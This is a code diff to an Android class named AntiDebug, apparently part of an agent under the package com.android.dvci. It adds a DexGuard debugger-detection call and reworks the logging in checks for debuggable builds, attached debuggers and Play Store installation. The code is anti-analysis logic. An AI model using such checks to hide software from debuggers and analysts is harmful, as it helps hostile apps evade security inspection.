@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.List;
+import java.util.Random;
 
 import android.content.ComponentName;
 import android.content.Intent;
@@ -29,12 +30,15 @@ import com.android.dvci.Beep;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 
-public class AntiDebug {
+import dexguard.util.CertificateChecker;
+import dexguard.util.DebugDetector;
 
+public class AntiDebug {
+	private static final String TAG = "AntiDebug";
 	public boolean checkFlag() {
 		boolean debug = (Status.self().getAppContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
-		if (Cfg.DEBUGANTI) {
-			Log.w("QZ", " checkFlag: " + debug);
+		if (Cfg.DEBUG) {
+			Check.log(TAG+ " checkFlag: " + debug);
 		}
 		return debug;
 	}
@@ -45,40 +49,47 @@ public class AntiDebug {
 
 		Utils.sleep(2000);
 
-		if (Cfg.DEBUGANTI) {
-			Log.w("QZ", " checkIp: " + checkDebugMode.IsDebug);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkIp: " + checkDebugMode.IsDebug);
 		}
 		return checkDebugMode.IsDebug;
 	}
 
 	public boolean checkConnected() {
-		if (Cfg.DEBUGANTI) {
-			Log.w("QZ", " checkConnected: " + Debug.isDebuggerConnected());
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkConnected: " + Debug.isDebuggerConnected());
 		}
 		return Debug.isDebuggerConnected();
 	}
 
 	public boolean isDebug() {
+		int rand = Utils.rand.nextInt();
+		boolean isOK = DebugDetector.isDebuggable(Status.getAppContext(), rand) == rand;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (isDebug) DebugDetector: " + isOK);
+		}
 		if (Cfg.DEBUGANTI) {
 			Beep.bip();
 			Beep.bip();
 			Beep.bip();
 		}
-		return checkFlag() || checkConnected() ;
+		return checkFlag() || checkConnected();
 	}
 
 	public boolean isPlayStore() {
 		PackageManager pm =  Status.getAppContext().getPackageManager();
 		try{
 			if ( pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null ) {
-				if (Cfg.DEBUGANTI) {
-					Log.w("QZ", " packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
 				}
 
 				return true;
 			}
 		}catch(Exception e){
-			Log.w("QZ", " NOT installed ?!?! " + e );
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (isPlayStore) not installed");
+			}
 		}
 		return false;
 	}
